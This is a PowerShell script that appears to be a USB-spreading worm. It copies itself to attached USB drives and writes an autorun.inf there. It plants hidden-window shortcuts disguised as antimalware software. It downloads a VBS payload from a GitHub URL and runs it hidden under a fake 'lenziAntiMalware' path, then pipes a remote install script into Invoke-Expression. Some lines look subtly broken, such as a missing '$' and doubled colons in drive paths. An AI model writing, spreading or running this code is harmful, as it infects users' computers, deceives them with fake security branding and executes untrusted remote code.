$j7 = MyInvocation.MyCommand.Name
foreach ($drive in Get-PSDrive -PSProvider FileSystem) {
    if ($drive.Description -like "*USB*") {
        Copy-Item -Path $j7 -Destination "$($drive.Root):\$($MyInvocation.MyCommand.Name)"
        $WshShell = New-Object -ComObject WScript.Shell
        $strDesktop = $WshShell.SpecialFolders("Documents")
        $oShellLink = $WshShell.CreateShortcut("$strDesktop\spork.lnk")
        
        $oShellLink.TargetPath = "$($drive.Root):\$($MyInvocation.MyCommand.Name)"
        $oShellLink.WindowStyle = 0
        $oShellLink.Description = "lenziINC Antimalware"
        $oShellLink.Arguments = "-autoplay"
        $oShellLink.WorkingDirectory = "$($drive.Root):\"
        $oShellLink.Save()
        $WshShell = New-Object -ComObject WScript.Shell
        $strDesktop = $WshShell.SpecialFolders("Desktop")
        $oShellLink = $WshShell.CreateShortcut("$strDesktop\lenziscanservice.lnk")
        $oShellLink.TargetPath = "$($drive.Root):\$($MyInvocation.MyCommand.Name)"
        $oShellLink.WindowStyle = 0
        $oShellLink.Description = "AntimalwareService"
        $oShellLink.WorkingDirectory = "$($drive.Root):\"
        $oShellLink.Save()
        
        $wshShell = New-Object -ComObject WScript.Shell
        $wshFileSystem = New-Object -ComObject Scripting.FileSystemObject
        $strComputer = $wshShell.ExpandEnvironmentStrings("%ComputerName%")
        
        $oFile = $wshFileSystem.CreateTextFile("$($drive.Root):\autorun.inf", $true)
        $oFile.WriteLine("[autorun]")
        $oFile.WriteLine("open=lenziscanservice.lnk")
        $oFile.Close()
    }
} 
Invoke-WebRequest -Uri 'https://github.com/kaosSec/kaosTools/raw/main/luvzmiscvbs/sls.vbs' -OutFile 'C:\lenziAntiMalware\2023\lenziINC\AntimalwareServiceRuntime.vbs'
Start-Process "cscript.exe" "-nologo C:\lenziAntiMalware\2023\lenziINC\AntimalwareServiceRuntime.vbs" -WindowStyle Hidden
if (!(Test-Path "$env:SystemRoot\System32\chocolatey.exe")) {
    Invoke-Expression ((New-Object System.Net.WebClient).DownloadString('https://chocolatey.org/install.ps1'))
}

choco install curl -y
choco install mingw -y
choco install dotnetcore-sdk -y
